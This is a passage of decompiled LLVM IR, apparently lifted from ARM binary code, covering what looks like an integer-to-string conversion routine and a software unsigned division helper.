  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fe20, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_fe30(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fe30:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_fe30 = load i32, i32* @r4, align 4
  %v12_fe30 = load i32, i32* @r7, align 4
  %v0_fe34 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_fe34, i32* %r8.global-to-local, align 4
  %v2_fe34 = icmp eq i32 %v0_fe34, 0
  store i1 %v2_fe34, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_fe34, label %dec_label_pc_ff14, label %dec_label_pc_fe44

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fe30
  %v3_fe44 = icmp eq i8 %arg1, 0
  store i1 %v3_fe44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fe44, label %.thread, label %dec_label_pc_fe58

.thread:                                          ; preds = %dec_label_pc_fe44
  %v4_fe4c = inttoptr i32 %v0_fe34 to i8*
  store i8 48, i8* %v4_fe4c, align 1
  %v0_fe50.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fe50.pr.pr, label %.thread1, label %dec_label_pc_fe58

.thread1:                                         ; preds = %.thread
  %v4_fe50 = load i32, i32* %r8.global-to-local, align 4
  %v5_fe50 = add i32 %v4_fe50, 1
  %v6_fe50 = inttoptr i32 %v5_fe50 to i8*
  store i8 0, i8* %v6_fe50, align 1
  %v0_fe54.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fe54.pr.pr, label %dec_label_pc_ff14, label %dec_label_pc_fe58

dec_label_pc_fe58:                                ; preds = %dec_label_pc_fe44, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_fe5c = icmp eq i32 %arg2, 10
  store i1 %v7_fe5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe5c, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_fe58
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_fe58
  %v4_fe58 = zext i1 %tmp47 to i32
  store i32 %v4_fe58, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_fe7c8 = sub nsw i32 0, %tmp
  %tmp.v3_fe7c8 = select i1 %phitmp, i32 %tmp, i32 %v3_fe7c8
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_fe7c8, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_fe88 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_fe88, i32* @r7, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %bb45, %.thread6
  %v0_fe8c = phi i32 [ %v0_feb0, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_fe8c, i32* %r0.global-to-local, align 4
  %v0_fe90 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_fe90, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_fe8c, 16777216
  %v1_fe94 = sdiv i32 %sext, 16777216
  %v3_fe94 = call i32 @function_10028(i32 %v1_fe94, i32 %v0_fe90)
  %v7_fe98 = icmp eq i32 %v0_fe90, 9
  store i1 %v7_fe98, i1* %cpsr_z.global-to-local, align 1
  %v1_fe9c = add i32 %v0_fe90, 48
  %v0_fea0 = load i32, i32* @r4, align 4
  store i32 %v0_fea0, i32* @r0, align 4
  %v7_fea4 = icmp sgt i32 %v0_fe90, 9
  %extract.t = trunc i32 %v1_fe9c to i8
  br i1 %v7_fea4, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_fe8c
  %v9_fea4 = add i32 %v0_fe90, 55
  %extract.t27 = trunc i32 %v9_fea4 to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_fe8c, %bb44
  %v0_feac.off0 = phi i8 [ %extract.t, %dec_label_pc_fe8c ], [ %extract.t27, %bb44 ]
  %v0_fea8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_fea8, i32* @r1, align 4
  %v2_feac = load i32, i32* %r5.global-to-local, align 4
  %v3_feac = load i32, i32* @r7, align 4
  %v4_feac = add i32 %v3_feac, %v2_feac
  %v5_feac = inttoptr i32 %v4_feac to i8*
  store i8 %v0_feac.off0, i8* %v5_feac, align 1
  %v0_feb0 = call i32 @function_ff2c()
  store i32 %v0_feb0, i32* %r0.global-to-local, align 4
  store i32 %v0_feb0, i32* @r4, align 4
  %v2_feb4 = icmp eq i32 %v0_feb0, 0
  store i1 %v2_feb4, i1* %cpsr_z.global-to-local, align 1
  %v0_feb8 = load i32, i32* %r5.global-to-local, align 4
  %v1_feb8 = add i32 %v0_feb8, -1
  store i32 %v1_feb8, i32* %r5.global-to-local, align 4
  br i1 %v2_feb4, label %dec_label_pc_fec0, label %dec_label_pc_fe8c

dec_label_pc_fec0:                                ; preds = %bb45
  %v0_fec0 = load i32, i32* %sl.global-to-local, align 4
  %v2_fec0 = icmp eq i32 %v0_fec0, 0
  store i1 %v2_fec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fec0, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_fec0
  %v3_fec4 = ptrtoint i32* %stack_var_-32 to i32
  %v3_fec8 = add i32 %v1_feb8, %v3_fec4
  store i32 %v3_fec8, i32* %r2.global-to-local, align 4
  %v4_fed0 = add i32 %v3_fec8, -34
  %v5_fed0 = inttoptr i32 %v4_fed0 to i8*
  store i8 45, i8* %v5_fed0, align 1
  %v0_fed4.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_fed4.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_fed4.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_fec0
  %v1_fed4 = phi i32 [ %v1_feb8, %dec_label_pc_fec0 ], [ %v1_fed4.pre, %.thread11 ]
  %v2_fed4 = add i32 %v1_fed4, 1
  store i32 %v2_fed4, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_fee0 = phi i32 [ %v2_fed4, %.thread12 ], [ %v1_fed4.pre, %.thread11 ]
  %v0_fed8 = load i32, i32* @r7, align 4
  %v2_fed8 = add i32 %v0_fed8, %v1_fee0
  %v3_fed8 = inttoptr i32 %v2_fed8 to i8*
  %v4_fed8 = load i8, i8* %v3_fed8, align 1
  %v6_fed8 = zext i8 %v4_fed8 to i32
  %v2_fedc = icmp eq i8 %v4_fed8, 0
  store i1 %v2_fedc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_fed8, i32* %r2.global-to-local, align 4
  br i1 %v2_fedc, label %dec_label_pc_ff24, label %dec_label_pc_feec.preheader

dec_label_pc_feec.preheader:                      ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_feec

dec_label_pc_feec:                                ; preds = %dec_label_pc_feec.preheader, %dec_label_pc_feec
  %v0_feec = phi i32 [ 0, %dec_label_pc_feec.preheader ], [ %v1_feec, %dec_label_pc_feec ]
  %v1_feec = add i32 %v0_feec, 1
  store i32 %v1_feec, i32* %r1.global-to-local, align 4
  %v2_fef0 = add i32 %v1_feec, %v2_fed8
  %v3_fef0 = inttoptr i32 %v2_fef0 to i8*
  %v4_fef0 = load i8, i8* %v3_fef0, align 1
  %v2_fef4 = icmp eq i8 %v4_fef0, 0
  store i1 %v2_fef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fef4, label %dec_label_pc_fefc, label %dec_label_pc_feec

dec_label_pc_fefc:                                ; preds = %dec_label_pc_feec, %dec_label_pc_ff24
  %v0_ff0024 = phi i32 [ %v6_fed8, %dec_label_pc_ff24 ], [ %v1_feec, %dec_label_pc_feec ]
  %v0_fefc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_fefc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ff00

dec_label_pc_ff00:                                ; preds = %dec_label_pc_ff00.dec_label_pc_ff00_crit_edge, %dec_label_pc_fefc
  %v2_ff0c = phi i32 [ %v5_ff0c, %dec_label_pc_ff00.dec_label_pc_ff00_crit_edge ], [ %v0_fefc, %dec_label_pc_fefc ]
  %v0_ff04 = phi i32 [ %v0_ff04.pre, %dec_label_pc_ff00.dec_label_pc_ff00_crit_edge ], [ %v2_fed8, %dec_label_pc_fefc ]
  %v0_ff00 = phi i32 [ %v0_ff00.pre, %dec_label_pc_ff00.dec_label_pc_ff00_crit_edge ], [ %v0_ff0024, %dec_label_pc_fefc ]
  %v1_ff00 = add i32 %v0_ff00, -1
  store i32 %v1_ff00, i32* %r1.global-to-local, align 4
  %v1_ff04 = inttoptr i32 %v0_ff04 to i8*
  %v2_ff04 = load i8, i8* %v1_ff04, align 1
  %v5_ff04 = add i32 %v0_ff04, 1
  store i32 %v5_ff04, i32* %r2.global-to-local, align 4
  %v3_ff08 = icmp eq i32 %v0_ff00, 0
  store i1 %v3_ff08, i1* %cpsr_z.global-to-local, align 1
  %v3_ff0c = inttoptr i32 %v2_ff0c to i8*
  store i8 %v2_ff04, i8* %v3_ff0c, align 1
  %v4_ff0c = load i32, i32* %r0.global-to-local, align 4
  %v5_ff0c = add i32 %v4_ff0c, 1
  store i32 %v5_ff0c, i32* %r0.global-to-local, align 4
  br i1 %v3_ff08, label %dec_label_pc_ff14, label %dec_label_pc_ff00.dec_label_pc_ff00_crit_edge

dec_label_pc_ff00.dec_label_pc_ff00_crit_edge:    ; preds = %dec_label_pc_ff00
  %v0_ff00.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_ff04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ff00

dec_label_pc_ff14:                                ; preds = %dec_label_pc_ff00, %.thread1, %dec_label_pc_fe30
  %v0_ff14 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_ff14, i32* %r0.global-to-local, align 4
  store i32 %v3_fe30, i32* @r4, align 4
  store i32 %v12_fe30, i32* @r7, align 4
  ret i32 %v0_ff14

dec_label_pc_ff24:                                ; preds = %.thread11._crit_edge
  store i32 %v6_fed8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fefc

; uselistorder directives
  uselistorder i32 %v5_ff0c, { 1, 0 }
  uselistorder i1 %v3_ff08, { 1, 0 }
  uselistorder i32 %v0_ff04, { 1, 0 }
  uselistorder i32 %v1_feec, { 0, 1, 3, 2 }
  uselistorder i32 %v6_fed8, { 1, 0 }
  uselistorder i32 %v2_fed8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_fed4.pre, { 1, 0 }
  uselistorder i32 %v1_feb8, { 1, 0, 2 }
  uselistorder i32 %v0_feb0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_fe90, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_fe34, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 1, 0 }
  uselistorder label %dec_label_pc_fefc, { 1, 0 }
  uselistorder label %dec_label_pc_feec, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_fe58, { 2, 1, 0 }
}

define i32 @function_ff2c() local_unnamed_addr {
dec_label_pc_ff2c:
  %r2.global-to-local = alloca i32, align 4
  %v0_ff2c = load i32, i32* @r1, align 4
  %v1_ff2c = add i32 %v0_ff2c, -1
  store i32 %v1_ff2c, i32* %r2.global-to-local, align 4
  %v2_ff2c = icmp eq i32 %v0_ff2c, 0
  %v7_ff2c = icmp eq i32 %v0_ff2c, 1
  %v0_ff30 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_ff2c, i32 %v0_ff30)
  br i1 %v2_ff2c, label %dec_label_pc_10014, label %dec_label_pc_ff38

dec_label_pc_ff38:                                ; preds = %dec_label_pc_ff2c
  %v0_ff38 = load i32, i32* @r0, align 4
  %v1_ff38 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_ff38, %v1_ff38
  br i1 %tmp, label %dec_label_pc_ff40, label %dec_label_pc_ffcc

dec_label_pc_ff40:                                ; preds = %dec_label_pc_ff38
  %v1_ff40 = load i32, i32* %r2.global-to-local, align 4
  %v2_ff40 = and i32 %v1_ff40, %v1_ff38
  %v4_ff40 = icmp eq i32 %v2_ff40, 0
  br i1 %v4_ff40, label %dec_label_pc_ffd8, label %dec_label_pc_ff48

dec_label_pc_ff48:                                ; preds = %dec_label_pc_ff40
  %v3_ff48 = icmp ult i32 %v1_ff38, 536870912
  br i1 %v3_ff48, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_ff48
  %v4_ff4c = mul i32 %v1_ff38, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_ff48, %.thread
  %v0_ff6c.pr36.ph = phi i32 [ %v4_ff4c, %.thread ], [ %v1_ff38, %dec_label_pc_ff48 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_ff48 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_ff6c.pr36 = phi i32 [ %v4_ff60, %bb81 ], [ %v0_ff6c.pr36.ph, %.preheader.preheader ]
  %v1_ff64 = phi i32 [ %v4_ff64, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_ff58 = icmp ugt i32 %v0_ff6c.pr36, 268435455
  br i1 %v2_ff58, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_ff6cthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_ff5c = icmp ult i32 %v0_ff6c.pr36, %v0_ff38
  br i1 %v4_ff5c, label %bb80, label %dec_label_pc_ff6cthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_ff60 = and i32 %v0_ff6c.pr36, 268435456
  %v3_ff60 = icmp eq i32 %v2_ff60, 0
  %v4_ff60 = mul i32 %v0_ff6c.pr36, 16
  br i1 %v3_ff60, label %bb81, label %dec_label_pc_ff6c.loopexit

bb81:                                             ; preds = %bb80
  %v2_ff64 = and i32 %v1_ff64, 268435456
  %v3_ff64 = icmp eq i32 %v2_ff64, 0
  %v4_ff64 = mul i32 %v1_ff64, 16
  br i1 %v3_ff64, label %.preheader, label %dec_label_pc_ff6cthread-pre-split.loopexit.loopexit

dec_label_pc_ff6cthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_ff7848.ph = phi i32 [ %v1_ff64, %bb ], [ %v4_ff64, %bb81 ]
  %v0_ff6c.pr38.ph = phi i32 [ %v0_ff6c.pr36, %bb ], [ %v4_ff60, %bb81 ]
  br label %dec_label_pc_ff6cthread-pre-split.loopexit

dec_label_pc_ff6cthread-pre-split.loopexit:       ; preds = %dec_label_pc_ff6cthread-pre-split.loopexit.loopexit, %.thread2
  %v1_ff7848 = phi i32 [ %v1_ff64, %.thread2 ], [ %v1_ff7848.ph, %dec_label_pc_ff6cthread-pre-split.loopexit.loopexit ]
  %v0_ff6c.pr38 = phi i32 [ %v0_ff6c.pr36, %.thread2 ], [ %v0_ff6c.pr38.ph, %dec_label_pc_ff6cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_ff6cthread-pre-split

dec_label_pc_ff6cthread-pre-split:                ; preds = %dec_label_pc_ff6cthread-pre-split.loopexit, %bb83
  %v1_ff7846 = phi i32 [ %v1_ff7848, %dec_label_pc_ff6cthread-pre-split.loopexit ], [ %v3_ff78, %bb83 ]
  %v0_ff6c.pr = phi i32 [ %v0_ff6c.pr38, %dec_label_pc_ff6cthread-pre-split.loopexit ], [ %v3_ff74, %bb83 ]
  br label %dec_label_pc_ff6c

dec_label_pc_ff6c.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_ff6c

dec_label_pc_ff6c:                                ; preds = %dec_label_pc_ff6c.loopexit, %dec_label_pc_ff6cthread-pre-split
  %v1_ff78 = phi i32 [ %v1_ff7846, %dec_label_pc_ff6cthread-pre-split ], [ %v1_ff64, %dec_label_pc_ff6c.loopexit ]
  %v1_ff74 = phi i32 [ %v0_ff6c.pr, %dec_label_pc_ff6cthread-pre-split ], [ %v4_ff60, %dec_label_pc_ff6c.loopexit ]
  %v2_ff6c = icmp slt i32 %v1_ff74, 0
  br i1 %v2_ff6c, label %dec_label_pc_ff80, label %bb82

bb82:                                             ; preds = %dec_label_pc_ff6c
  %v4_ff70 = icmp ult i32 %v1_ff74, %v0_ff38
  br i1 %v4_ff70, label %bb83, label %dec_label_pc_ff80

bb83:                                             ; preds = %bb82
  %v3_ff74 = mul i32 %v1_ff74, 2
  %v2_ff78 = icmp slt i32 %v1_ff78, 0
  %v3_ff78 = mul i32 %v1_ff78, 2
  br i1 %v2_ff78, label %dec_label_pc_ff80, label %dec_label_pc_ff6cthread-pre-split

dec_label_pc_ff80:                                ; preds = %bb82, %dec_label_pc_ff6c, %bb83
  %v2_ff8c59 = phi i32 [ %v3_ff78, %bb83 ], [ %v1_ff78, %bb82 ], [ %v1_ff78, %dec_label_pc_ff6c ]
  %v1_ff8451 = phi i32 [ %v3_ff74, %bb83 ], [ %v1_ff74, %bb82 ], [ %v1_ff74, %dec_label_pc_ff6c ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ff84

dec_label_pc_ff84:                                ; preds = %.thread11, %dec_label_pc_ff80
  %v1_ffb8 = phi i32 [ %v4_ffb8, %.thread11 ], [ %v2_ff8c59, %dec_label_pc_ff80 ]
  %v1_ff8c = phi i32 [ %v0_ffc4, %.thread11 ], [ 0, %dec_label_pc_ff80 ]
  %v1_ffbc = phi i32 [ %v4_ffbc, %.thread11 ], [ %v1_ff8451, %dec_label_pc_ff80 ]
  %v1_ff88 = phi i32 [ %v0_ffb4, %.thread11 ], [ %v0_ff38, %dec_label_pc_ff80 ]
  %v3_ff84 = icmp ult i32 %v1_ff88, %v1_ffbc
  br i1 %v3_ff84, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_ff84
  %v3_ff88 = sub i32 %v1_ff88, %v1_ffbc
  %v3_ff8c = or i32 %v1_ff8c, %v1_ffb8
  store i32 %v3_ff8c, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_ff84, %bb84
  %v1_ff94 = phi i32 [ %v1_ff88, %dec_label_pc_ff84 ], [ %v3_ff88, %bb84 ]
  %v1_ff98 = phi i32 [ %v1_ff8c, %dec_label_pc_ff84 ], [ %v3_ff8c, %bb84 ]
  %v4_ff90 = udiv i32 %v1_ffbc, 2
  %v6_ff90 = icmp ult i32 %v1_ff94, %v4_ff90
  br i1 %v6_ff90, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_ff94 = urem i32 %v1_ffbc, 2
  %v4_ff94 = icmp eq i32 %v3_ff94, 0
  %v6_ff94 = sub i32 %v1_ff94, %v4_ff90
  br i1 %v4_ff94, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_ff98 = udiv i32 %v1_ffb8, 2
  %v6_ff98 = or i32 %v1_ff98, %v5_ff98
  store i32 %v6_ff98, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_ffa0 = phi i32 [ %v6_ff94, %bb85 ], [ %v1_ff94, %.thread7 ], [ %v6_ff94, %bb86 ]
  %v1_ffa4 = phi i32 [ %v1_ff98, %bb85 ], [ %v1_ff98, %.thread7 ], [ %v6_ff98, %bb86 ]
  %v4_ff9c = udiv i32 %v1_ffbc, 4
  %v6_ff9c = icmp ult i32 %v1_ffa0, %v4_ff9c
  br i1 %v6_ff9c, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_ffa0 = and i32 %v1_ffbc, 2
  %v4_ffa0 = icmp eq i32 %v3_ffa0, 0
  %v6_ffa0 = sub i32 %v1_ffa0, %v4_ff9c
  br i1 %v4_ffa0, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_ffa4 = udiv i32 %v1_ffb8, 4
  %v6_ffa4 = or i32 %v1_ffa4, %v5_ffa4
  store i32 %v6_ffa4, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_ffac = phi i32 [ %v6_ffa0, %bb87 ], [ %v1_ffa0, %.thread8 ], [ %v6_ffa0, %bb88 ]
  %v1_ffb0 = phi i32 [ %v1_ffa4, %bb87 ], [ %v1_ffa4, %.thread8 ], [ %v6_ffa4, %bb88 ]
  %v4_ffa8 = udiv i32 %v1_ffbc, 8
  %v6_ffa8 = icmp ult i32 %v1_ffac, %v4_ffa8
  br i1 %v6_ffa8, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_ffac = and i32 %v1_ffbc, 4
  %v4_ffac = icmp eq i32 %v3_ffac, 0
  %v6_ffac = sub i32 %v1_ffac, %v4_ffa8
  br i1 %v4_ffac, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_ffb0 = udiv i32 %v1_ffb8, 8
  %v6_ffb0 = or i32 %v1_ffb0, %v5_ffb0
  store i32 %v6_ffb0, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_ffc4 = phi i32 [ %v1_ffb0, %bb89 ], [ %v1_ffb0, %.thread9 ], [ %v6_ffb0, %bb90 ]
  %v0_ffb4 = phi i32 [ %v6_ffac, %bb89 ], [ %v1_ffac, %.thread9 ], [ %v6_ffac, %bb90 ]
  %v2_ffb4 = icmp eq i32 %v0_ffb4, 0
  br i1 %v2_ffb4, label %dec_label_pc_ffc4, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_ffb8, 16
  br i1 %tmp138, label %dec_label_pc_ffc4, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_ffb8 = udiv i32 %v1_ffb8, 16
  %v4_ffbc = udiv i32 %v1_ffbc, 16
  br label %dec_label_pc_ff84

dec_label_pc_ffc4:                                ; preds = %thread-pre-split, %bb91
  ret i32 %v0_ffc4

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ff38
  %v9_ff38 = icmp eq i32 %v0_ff38, %v1_ff38
  %. = zext i1 %v9_ff38 to i32
  ret i32 %.

dec_label_pc_ffd8:                                ; preds = %dec_label_pc_ff40
  %v2_ffd8 = icmp ugt i32 %v1_ff38, 65535
  br i1 %v2_ffd8, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_ffd8
  %v2_ffdc = and i32 %v1_ff38, 32768
  %v3_ffdc = icmp eq i32 %v2_ffdc, 0
  %v4_ffdc = udiv i32 %v1_ff38, 65536
  br i1 %v3_ffdc, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_ffd8
  %v0_ffe865 = phi i32 [ %v1_ff38, %dec_label_pc_ffd8 ], [ %v4_ffdc, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_ffec = phi i32 [ %v0_ffe865, %.thread16 ], [ %v4_ffdc, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_ffe8 = icmp ugt i32 %v1_ffec, 255
  br i1 %v2_ffe8, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_ffec = and i32 %v1_ffec, 128
  %v3_ffec = icmp eq i32 %v2_ffec, 0
  %v4_ffec = udiv i32 %v1_ffec, 256
  br i1 %v3_ffec, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_fff0 = or i32 %storemerge, 8
  store i32 %v2_fff0, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_fffc = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_fff0, %bb98 ]
  %v1_fff8 = phi i32 [ %v1_ffec, %bb96 ], [ %v4_ffec, %bb97 ], [ %v4_ffec, %bb98 ]
  %v2_fff4 = icmp ugt i32 %v1_fff8, 15
  br i1 %v2_fff4, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_fff8 = and i32 %v1_fff8, 8
  %v3_fff8 = icmp eq i32 %v2_fff8, 0
  %v4_fff8 = udiv i32 %v1_fff8, 16
  br i1 %v3_fff8, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_fffc = add nsw i32 %v1_fffc, 4
  store i32 %v2_fffc, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10004 = phi i32 [ %v1_fffc, %.thread17 ], [ %v1_fffc, %bb99 ], [ %v2_fffc, %bb100 ]
  %v5_10008 = phi i32 [ %v1_fff8, %.thread17 ], [ %v4_fff8, %bb99 ], [ %v4_fff8, %bb100 ]
  %v2_10000 = icmp ugt i32 %v5_10008, 3
  %v7_10000 = icmp eq i32 %v5_10008, 4
  %v2_10004 = xor i1 %v7_10000, true
  %v3_10004 = and i1 %v2_10000, %v2_10004
  br i1 %v3_10004, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10004 = add nsw i32 %v4_10004, 3
  store i32 %v5_10004, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10008 = phi i32 [ %v4_10004, %.thread18 ], [ %v5_10004, %bb101 ]
  %v2_10008 = xor i1 %v2_10000, true
  %v3_10008 = or i1 %v7_10000, %v2_10008
  br i1 %v3_10008, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10008 = udiv i32 %v5_10008, 2
  %v9_10008 = add i32 %v4_10008, %v8_10008
  store i32 %v9_10008, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_1000c = phi i32 [ %v4_10008, %bb102 ], [ %v9_10008, %bb103 ]
  %v6_1000c = lshr i32 %v0_ff38, %v1_1000c
  ret i32 %v6_1000c

dec_label_pc_10014:                               ; preds = %dec_label_pc_ff2c
  %v0_10014 = load i32, i32* @lr, align 4
  %v0_10018 = call i32 @function_10184()
  store i32 %v0_10014, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10008, { 1, 0 }
  uselistorder i1 %v7_10000, { 1, 0 }
  uselistorder i32 %v4_fff8, { 1, 0 }
  uselistorder i32 %v1_fff8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fff0, { 1, 0 }
  uselistorder i32 %v4_ffec, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ffec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ffdc, { 1, 0 }
  uselistorder i32 %v0_ffb4, { 1, 0 }
  uselistorder i32 %v4_ffa8, { 1, 0 }
  uselistorder i32 %v1_ffb0, { 1, 2, 0 }
  uselistorder i32 %v4_ff9c, { 1, 0 }
  uselistorder i32 %v1_ffa4, { 1, 2, 0 }
  uselistorder i32 %v4_ff90, { 1, 0 }
  uselistorder i32 %v1_ff98, { 1, 2, 0 }
  uselistorder i32 %v1_ffbc, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_ff8c, { 1, 0 }
  uselistorder i32 %v1_ffb8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_ff78, { 1, 0 }
  uselistorder i32 %v3_ff74, { 1, 0 }
  uselistorder i32 %v1_ff74, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_ff78, { 1, 2, 0, 3 }
  uselistorder i32 %v4_ff64, { 1, 0 }
  uselistorder i32 %v4_ff60, { 2, 1, 0 }
  uselistorder i32 %v1_ff64, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_ff6c.pr36, { 1, 2, 0, 5, 4, 3 }
